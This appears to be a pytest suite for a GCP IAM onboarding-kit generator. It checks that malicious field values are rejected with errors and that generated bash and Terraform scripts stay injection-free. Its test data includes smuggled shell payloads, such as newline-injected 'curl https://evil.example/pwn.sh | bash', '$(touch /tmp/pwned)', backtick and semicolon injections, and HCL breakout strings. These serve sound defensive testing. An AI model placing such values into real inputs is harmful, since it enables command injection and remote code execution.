"""Offline unit & API tests for T01 — Injection-free Customer Onboarding Kit."""

from __future__ import annotations

import io
import subprocess
import zipfile
from pathlib import Path
from typing import Any, Dict, List

import pytest
from fastapi.testclient import TestClient

from backend.identity_guard import (
    IAM_SESSION_COOKIE,
    IamConsultantIdentity,
    mint_consultant_cookie,
)
from backend.main import OnboardingKitRequest, app
from backend.tools.onboarding_manager import generate_customer_onboarding_kit

GOLDEN_DIR = Path(__file__).resolve().parent / "golden"

VALID_BASE_PAYLOAD: Dict[str, Any] = {
    "customer_name": "Acme Financial Corp",
    "organization_id": "123456789012",
    "organization_domain": "acme.com",
    "seed_project_id": "prj-sec-governance",
    "onboarding_mode": "impersonated_sa",
    "impersonator_user_email": "user:alice@acme.com",
    "sa_account_id": "sa-iam-assessor",
}


def _authenticated_client() -> TestClient:
    client = TestClient(app)
    ident = IamConsultantIdentity(
        email="tester@example.com",
        display_name="Offline Tester",
        domain="example.com",
        subject="offline-tester-sub",
        auth_channel="verified_google_cookie",
        session_id="t01-test-session-id",
    )
    client.cookies.set(IAM_SESSION_COOKIE, mint_consultant_cookie(ident))
    return client


MALICIOUS_FIELD_CASES = [
    # Newline & control-character injection (PoC: curl ... | bash)
    ("customer_name", "Acme\ncurl https://evil.example/pwn.sh | bash"),
    ("customer_name", "Acme\r\nid"),
    ("customer_name", "Acme\x00Corp"),
    ("customer_name", "Acme\tCorp"),
    ("organization_id", "123456789012\ncurl https://evil.example/pwn.sh | bash"),
    ("organization_domain", "acme.com\ncurl https://evil.example/pwn.sh | bash"),
    ("seed_project_id", "prj-sec-governance\nid"),
    ("impersonator_user_email", "alice@acme.com\ncurl https://evil.example/pwn.sh | bash"),
    ("sa_account_id", "sa-iam-assessor\nid"),
    # Command substitution $(...) (PoC: SEED_PROJECT_ID="${2:-$(touch /tmp/pwned)}")
    ("seed_project_id", "$(touch /tmp/pwned)"),
    ("customer_name", "Acme $(touch /tmp/pwned)"),
    ("organization_domain", "$(id).acme.com"),
    ("impersonator_user_email", "$(id)@acme.com"),
    ("sa_account_id", "sa-$(id)"),
    # Backticks `...`
    ("customer_name", "Acme `id`"),
    ("seed_project_id", "prj-`id`"),
    ("organization_domain", "`id`.acme.com"),
    ("impersonator_user_email", "`id`@acme.com"),
    # Quotes & HCL breakout
    ("customer_name", 'Acme "Quoted" Corp'),
    ("seed_project_id", 'prj-a" ; resource "x" "y" {'),
    ("organization_domain", 'acme"evil.com'),
    ("impersonator_user_email", 'alice"x@acme.com'),
    # Semicolon & shell metacharacters
    ("customer_name", "Acme; touch /tmp/pwned"),
    ("organization_domain", "acme.com;id"),
    ("seed_project_id", "prj-sec;id"),
    ("impersonator_user_email", "alice@acme.com;id"),
    ("sa_account_id", "sa-iam;id"),
    # Forbidden IAM principal prefixes & wildcards
    ("impersonator_user_email", "domain:evil.com"),
    ("impersonator_user_email", "domain:alice@evil.com"),
    ("impersonator_user_email", "serviceAccount:sa@evil-proj.iam.gserviceaccount.com"),
    ("impersonator_user_email", "allUsers"),
    ("impersonator_user_email", "allAuthenticatedUsers"),
    ("impersonator_user_email", "principal://iam.googleapis.com/projects/1/locations/global/workloadIdentityPools/p/subject/s"),
    # Boundary & structural violations
    ("customer_name", ""),
    ("customer_name", "   "),
    ("customer_name", "A" * 81),
    ("organization_domain", "ACME.COM"),
    ("organization_domain", "-acme.com"),
    ("organization_domain", "localhost"),
    ("seed_project_id", "short"),
    ("seed_project_id", "1invalid-project-id"),
    ("seed_project_id", "UPPER-PROJECT-ID"),
    ("seed_project_id", "a" * 31),
    ("sa_account_id", ""),
    ("sa_account_id", "short"),
    ("sa_account_id", "sa_with_underscore"),
    ("onboarding_mode", "root_admin"),
    ("onboarding_mode", "impersonated_sa;id"),
]


@pytest.mark.parametrize("field_name,bad_value", MALICIOUS_FIELD_CASES)
def test_malicious_payloads_raise_value_error_and_http_4xx(
    field_name: str,
    bad_value: str,
) -> None:
    """Every malicious or invalid payload must raise ValueError in Python and return HTTP 4xx on both routes."""
    kwargs = dict(VALID_BASE_PAYLOAD)
    kwargs[field_name] = bad_value

    with pytest.raises(ValueError):
        generate_customer_onboarding_kit(**kwargs)

    client = _authenticated_client()
    resp_kit = client.post("/api/v1/onboarding/kit", json=kwargs)
    assert 400 <= resp_kit.status_code < 500, (
        f"Expected 4xx for POST /api/v1/onboarding/kit with {field_name}={bad_value!r}, "
        f"got {resp_kit.status_code}: {resp_kit.text}"
    )

    resp_zip = client.post("/api/v1/onboarding/download-kit", json=kwargs)
    assert 400 <= resp_zip.status_code < 500, (
        f"Expected 4xx for POST /api/v1/onboarding/download-kit with {field_name}={bad_value!r}, "
        f"got {resp_zip.status_code}: {resp_zip.text}"
    )


def test_onboarding_request_schema_defines_max_length_and_pattern() -> None:
    """Every free-text field in OnboardingKitRequest must declare max_length and pattern constraints."""
    for field_name, field_info in OnboardingKitRequest.model_fields.items():
        if field_info.annotation is bool:
            # A boolean cannot carry injected text; the string constraints only apply to free-text fields
            continue
        has_max_len = any(getattr(m, "max_length", None) is not None for m in field_info.metadata)
        has_pattern = any(getattr(m, "pattern", None) is not None for m in field_info.metadata)
        assert has_max_len, f"OnboardingKitRequest.{field_name} is missing max_length"
        assert has_pattern, f"OnboardingKitRequest.{field_name} is missing pattern"


@pytest.mark.parametrize(
    "kwargs,golden_filename",
    [
        (
            {
                "customer_name": "O'Reilly & Sons (BR) - Co., Inc.",
                "organization_id": "123456789012",
                "organization_domain": "oreilly.example.com",
                "seed_project_id": "prj-sec-governance",
                "onboarding_mode": "impersonated_sa",
                "impersonator_user_email": "user:alice@oreilly.example.com",
                "sa_account_id": "sa-iam-assessor",
            },
            "customer_iam_onboarding_impersonated_sa.sh",
        ),
        (
            {
                "customer_name": "Acme Financial Corp",
                "organization_id": "123456789012",
                "organization_domain": "acme.com",
                "seed_project_id": "prj-sec-governance",
                "onboarding_mode": "direct_user",
                "impersonator_user_email": "group:iam-auditors@acme.com",
            },
            "customer_iam_onboarding_direct_user.sh",
        ),
    ],
)
def test_valid_bash_script_passes_bash_n_and_matches_golden(
    kwargs: Dict[str, Any],
    golden_filename: str,
) -> None:
    """Valid inputs generate syntax-valid bash (`bash -n` == 0) matching the golden file exactly."""
    kit = generate_customer_onboarding_kit(**kwargs)
    bash_script = kit["bash_script"]

    proc = subprocess.run(
        ["bash", "-n"],
        input=bash_script,
        text=True,
        capture_output=True,
        check=False,
    )
    assert proc.returncode == 0, f"bash -n failed: {proc.stderr}"

    golden_path = GOLDEN_DIR / golden_filename
    assert golden_path.exists(), f"Missing golden file: {golden_path}"
    assert bash_script == golden_path.read_text(encoding="utf-8")


def test_defense_in_depth_no_dynamic_values_in_comments_echo_or_defaults() -> None:
    """Dynamic values never appear in bash/HCL comments, echo lines, or ${2:-...} expressions."""
    dynamic_tokens = [
        "O'Reilly",
        "987654321098",
        "oreilly.example.com",
        "prj-unique-seed-42",
        "alice.unique@oreilly.example.com",
        "sa-custom-reader",
    ]
    kit = generate_customer_onboarding_kit(
        customer_name="O'Reilly & Co.",
        organization_id="987654321098",
        organization_domain="oreilly.example.com",
        seed_project_id="prj-unique-seed-42",
        onboarding_mode="impersonated_sa",
        impersonator_user_email="user:alice.unique@oreilly.example.com",
        sa_account_id="sa-custom-reader",
    )

    for line in kit["bash_script"].splitlines():
        stripped = line.lstrip()
        if stripped.startswith("#"):
            for tok in dynamic_tokens:
                assert tok not in stripped, f"Dynamic value {tok!r} leaked into bash comment: {line}"
        if stripped.startswith("echo "):
            for tok in dynamic_tokens:
                assert tok not in stripped, f"Dynamic value {tok!r} leaked into echo line: {line}"
        if "${1:-" in line or "${2:-" in line:
            pytest.fail(f"Dynamic default inside ${{1:-...}} / ${{2:-...}} is forbidden: {line}")

    for line in kit["terraform_hcl"].splitlines():
        stripped = line.lstrip()
        if stripped.startswith("#"):
            for tok in dynamic_tokens:
                assert tok not in stripped, f"Dynamic value {tok!r} leaked into HCL comment: {line}"


def test_empty_optional_fields_pass_validation_and_bash_n() -> None:
    """Empty optional fields use shlex-quoted placeholders and still produce syntax-valid bash."""
    kit = generate_customer_onboarding_kit(
        customer_name="Enterprise Customer",
        organization_id="",
        organization_domain="",
        seed_project_id="",
        onboarding_mode="impersonated_sa",
        impersonator_user_email="",
    )
    proc = subprocess.run(
        ["bash", "-n"],
        input=kit["bash_script"],
        text=True,
        capture_output=True,
        check=False,
    )
    assert proc.returncode == 0, f"bash -n failed for placeholder script: {proc.stderr}"
    assert "DEFAULT_SEED_PROJECT_ID='<SEED_PROJECT_ID>'" in kit["bash_script"]
    assert 'default     = "<SEED_PROJECT_ID>"' in kit["terraform_hcl"]


def test_get_download_kit_returns_405_and_post_returns_zip() -> None:
    """GET /api/v1/onboarding/download-kit returns 405; POST returns a valid ZIP bundle."""
    client = _authenticated_client()

    resp_get = client.get(
        "/api/v1/onboarding/download-kit",
        params={"organization_id": "123456789012"},
    )
    assert resp_get.status_code == 405

    resp_post = client.post(
        "/api/v1/onboarding/download-kit",
        headers={"X-Requested-With": "XMLHttpRequest"},
        json={
            "customer_name": "O'Reilly & Sons (BR) - Co., Inc.",
            "organization_id": "123456789012",
            "organization_domain": "oreilly.example.com",
            "seed_project_id": "prj-sec-governance",
            "onboarding_mode": "impersonated_sa",
            "impersonator_user_email": "user:alice@oreilly.example.com",
            "sa_account_id": "sa-iam-assessor",
        },
    )
    assert resp_post.status_code == 200
    assert resp_post.headers["content-type"] == "application/zip"

    with zipfile.ZipFile(io.BytesIO(resp_post.content), "r") as zf:
        names = set(zf.namelist())
        assert "agentic_iam_onboarding_123456789012/customer_iam_onboarding.sh" in names
        assert "agentic_iam_onboarding_123456789012/customer_iam_onboarding.tf" in names
        assert "agentic_iam_onboarding_123456789012/HOW_TO_ONBOARD.md" in names
        sh_content = zf.read("agentic_iam_onboarding_123456789012/customer_iam_onboarding.sh").decode("utf-8")
        golden_sh = (GOLDEN_DIR / "customer_iam_onboarding_impersonated_sa.sh").read_text(encoding="utf-8")
        assert sh_content == golden_sh


def test_web_ui_js_downloads_kit_via_post_fetch_blob() -> None:
    """The Web UI JavaScript uses POST fetch + blob for /api/v1/onboarding/download-kit, never GET navigation."""
    client = TestClient(app)
    resp = client.get("/")
    assert resp.status_code == 200
    html = resp.text
    assert "/api/v1/onboarding/download-kit?" not in html
    assert "fetch('/api/v1/onboarding/download-kit'" in html
    assert "res.blob()" in html


class _DummyCtx:
    def __enter__(self) -> "_DummyCtx":
        return self

    def __exit__(self, *args: Any) -> bool:
        return False


class _FakeStreamlit:
    """Lightweight offline Streamlit stub for testing `_render_onboarding_generator`."""

    def __init__(self, inputs: Dict[str, str], mode: str = "impersonated_sa") -> None:
        self._inputs = inputs
        self._mode = mode
        self.errors: List[str] = []
        self.infos: List[str] = []
        self.downloads: List[Dict[str, Any]] = []
        self.codes: List[str] = []
        self.markdowns: List[str] = []

    def markdown(self, text: str, **kwargs: Any) -> None:
        self.markdowns.append(text)

    def columns(self, count: int) -> List[_DummyCtx]:
        return [_DummyCtx() for _ in range(count)]

    def tabs(self, labels: List[str]) -> List[_DummyCtx]:
        return [_DummyCtx() for _ in labels]

    def text_input(self, label: str, value: str = "", **kwargs: Any) -> str:
        return self._inputs.get(label, value)

    def selectbox(self, label: str, options: List[str], **kwargs: Any) -> str:
        return self._mode

    def info(self, msg: str) -> None:
        self.infos.append(msg)

    def error(self, msg: str) -> None:
        self.errors.append(msg)

    def download_button(self, **kwargs: Any) -> None:
        self.downloads.append(kwargs)

    def code(self, body: str, **kwargs: Any) -> None:
        self.codes.append(body)


@pytest.mark.parametrize(
    "bad_inputs",
    [
        {
            "Customer Name": "Acme\ncurl https://evil.example | bash",
            "Customer GCP Organization ID": "123456789012",
            "Primary Domain": "acme.com",
            "Customer Seed Project ID": "prj-sec-governance",
            "Authorized User Email (Impersonator)": "alice@acme.com",
        },
        {
            "Customer Name": "Acme Corp",
            "Customer GCP Organization ID": "123456789012",
            "Primary Domain": "acme.com",
            "Customer Seed Project ID": "$(touch /tmp/pwned)",
            "Authorized User Email (Impersonator)": "alice@acme.com",
        },
        {
            "Customer Name": "Acme Corp",
            "Customer GCP Organization ID": "123456789012",
            "Primary Domain": "acme.com",
            "Customer Seed Project ID": "prj-sec-governance",
            "Authorized User Email (Impersonator)": "domain:evil.com",
        },
    ],
)
def test_streamlit_onboarding_generator_shows_validation_error_instead_of_kit(
    monkeypatch: pytest.MonkeyPatch,
    bad_inputs: Dict[str, str],
) -> None:
    """Streamlit generator displays st.error and generates no kit or download button on invalid inputs."""
    import frontend.app as streamlit_app

    fake_st = _FakeStreamlit(bad_inputs)
    monkeypatch.setattr(streamlit_app, "st", fake_st)

    streamlit_app._render_onboarding_generator()

    assert len(fake_st.errors) == 1
    assert fake_st.errors[0].strip() != ""
    assert fake_st.downloads == []
    assert fake_st.codes == []


def test_streamlit_onboarding_generator_renders_kit_on_valid_inputs(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Streamlit generator succeeds without errors and offers ZIP download on valid inputs."""
    import frontend.app as streamlit_app

    fake_st = _FakeStreamlit(
        {
            "Customer Name": "Acme Financial Corp",
            "Customer GCP Organization ID": "123456789012",
            "Primary Domain": "acme.com",
            "Customer Seed Project ID": "prj-sec-governance",
            "Authorized User Email (Impersonator)": "user:alice@acme.com",
        }
    )
    monkeypatch.setattr(streamlit_app, "st", fake_st)

    streamlit_app._render_onboarding_generator()

    assert fake_st.errors == []
    assert len(fake_st.downloads) == 1
    assert len(fake_st.codes) == 2
